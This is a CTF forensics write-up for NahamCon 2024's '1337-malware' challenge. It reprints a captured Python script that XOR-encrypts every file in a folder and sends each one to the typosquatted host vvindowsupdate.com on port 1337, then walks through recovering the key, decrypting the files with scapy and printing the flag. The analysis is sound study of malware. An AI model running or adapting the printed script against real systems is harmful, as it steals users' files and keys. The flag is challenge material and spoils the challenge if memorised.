---
layout: post
title: Nahamcon CTF 2024 | Forensics-Writeups
date: 2024-05-26
tags: ['Nahamcon_CTF_2024']
math: True
---

# Forensics/1337-malware writeup

## Challenge description

We received a plea for help from a rather frustrated looking employee. He said he accidently ran malware on his computer, but when he tried to pay the "leet hacker" to get his files back they said the malware was "broken"... best IT could do was provide us a PCAP. 

Download the file(s) below: 

[1337-malware.pcapng](../assets/1337-malware.pcapng)


## Solution
First, let us analyse the pcap file.
For brevity, let us call the system with IP address 192.168.56.101 as A and that with 192.168.56.1 as B.

We can see a python code sent by A to B in the packet No.7 which is as follows:

```python
import socket
import base64
import os
from random import randbytes
from pwn import xor

# DON'T FORGET TO CHANGE THIS TO THE REAL KEY!!!!
key = randbytes(32)

def encrypt(filename):
    f = open(filename, 'rb')
    data = f.read()
    f.close()
   
    encrypted = xor(data, key)
    return encrypted

def send_encrypted(filename):
    print(f'sending {filename}')
    data = encrypt(filename)
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('vvindowsupdate.com', 1337))
    s.sendall((f'Sending: {filename}').encode())
    s.close()

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('vvindowsupdate.com', 1337))
    s.sendall(data)
    s.close()

def get_all_files():
    file_paths = []
    for root, dirs, files in os.walk(os.path.dirname(os.path.realpath(__file__))):
        for file in files:
            file_paths.append(os.path.join(root, file))
    file_paths.remove(__file__)      
    return file_paths

files = get_all_files()
for f in files:
    send_encrypted(f)
    #os.remove(f)
```

In short, when this script is run in a folder, it generates a random 32 bytes key and then encrypts (by XOR with this key) and sends all the files (one after the other) present in that folder and in its sub-folders to the remote server `vvindowsupdate.com` on the port `1337`.

On analyzing packets further, we find a part of output of the above code i.e. `Sending: /home/davey/Documents/resources.zip` in packet No.15 sent by B to A and on following the subsequent TCP stream (stream 2), we get the encrypted data of the file `resources.zip` again sent by B to A. This implies that B has run the above script in the folder `/home/davey/Documents`.

In the next packets, we find the following files (mentioned along with TCP stream of their encrypted data), sent by B to A in encrypted form:
- ecorp.png -> TCP stream 4 
- Welcome Aboard.pdf -> stream 6
- /.ssh/id_rsa -> stream 8
- /.ssh/id_rsa.pub -> stream 10

Now we have the encrypted data of 5 files. So we have to decrypt them to get the flag.To decrypt them we have to XOR them with that randomly generated 32 bytes key. To find the 32 bytes key, we will use the header bytes of files (which are standard for a file format). But we will also use a little luck here, because otherwise, we would not be able to find the 32 bytes key.

The first 16 bytes of PNG files `8950 4e47 0d0a 1a0a 0000 000d 4948 4452` do not change so often , so we will find the first 16 bytes of the key by taking their XOR with the first 16 bytes of the encrypted `ecorp.png` file. 

So the first 16 bytes of the key are `82 C2 53 50 8B D5 4C 47 A7 E5 6D EC D8 76 B5 D6`

Now to find the remaining bytes, we will use `resources.zip`. The 30th and 31st byte of a zip file store the 1st and 2nd character of the name of the zip file, that are 'r' and 'e'. The 26th and 27th bytes store the length of the name of the zip file, which is 10 in our case (`resources/`). Now after observing the initial bytes of multiple zip files, we get to know that the remaining bytes of header (except the first 16 and those found above) are mostly `00`. Using all this information, we find the probable key i.e.  `82 C2 53 50 8B D5 4C 47 A7 E5 6D EC D8 76 B5 D6 a4 27 c6 45 09 0b 72 e1 b9 71 33 22 e2 e1 59 59`. 

Now we will write a python script to carve out the required encrypted data from the TCP stream of the respective file and try to decrypt it using the above key. If we try to decrypt the resources.zip file using the above key, we find that the key has some error in it. On observing the hexdump of the decrypted resources.zip, we find a string `wepcome.txt`.It is intuitive that it should be `welcome.txt` and so therefore we find that the corrected key should be `82 C2 53 50 8B D5 4C 47 A7 E5 6D EC D8 76 B5 D6 a4 27 c6 45 09 0b 72 e1 b9 71 33 22 fe e1 59 59`.

Now we just have to decrypt the files using this key. The script for decrypting ecorp.png (as an example) is:

```python
from scapy.all import rdpcap
from Crypto.Util.number import *

pcap = rdpcap("1337-malware.pcapng")

stream_src_IP = '192.168.56.1'
stream_dst_IP = '192.168.56.101'
stream_src_port = 33934
stream_dst_port = 1337

stream_packets = [pkt for pkt in pcap if pkt.haslayer('IP') and pkt.haslayer('TCP') and 
               pkt['IP'].src == stream_src_IP and pkt['IP'].dst == stream_dst_IP and 
               pkt['TCP'].sport == stream_src_port and pkt['TCP'].dport == stream_dst_port]

img_enc_data = b"".join(bytes(pkt['TCP'].payload) for pkt in stream_packets)

key = ['82','C2','53','50','8B','D5','4C','47','A7','E5','6D','EC','D8','76','B5','D6','a4','27','c6','45','09','0b','72','e1','b9','71','33','22','fe','e1','59','59']

img_data = b""

for i in range(len(img_enc_data)):
    e = img_enc_data[i]^bytes_to_long(bytes.fromhex(key[i%32]))
    img_data += long_to_bytes(e)

with open("dec.png",'wb') as f:
    f.write(img_data)
```

We can decrypt the pdf and zip file using a similar python script. We find the password of resources.zip in the pdf, use it to uncompress the zip file and find the flag in flag.txt that is:

`flag{c95c4ff18b0eb88123de779051a7a24f}`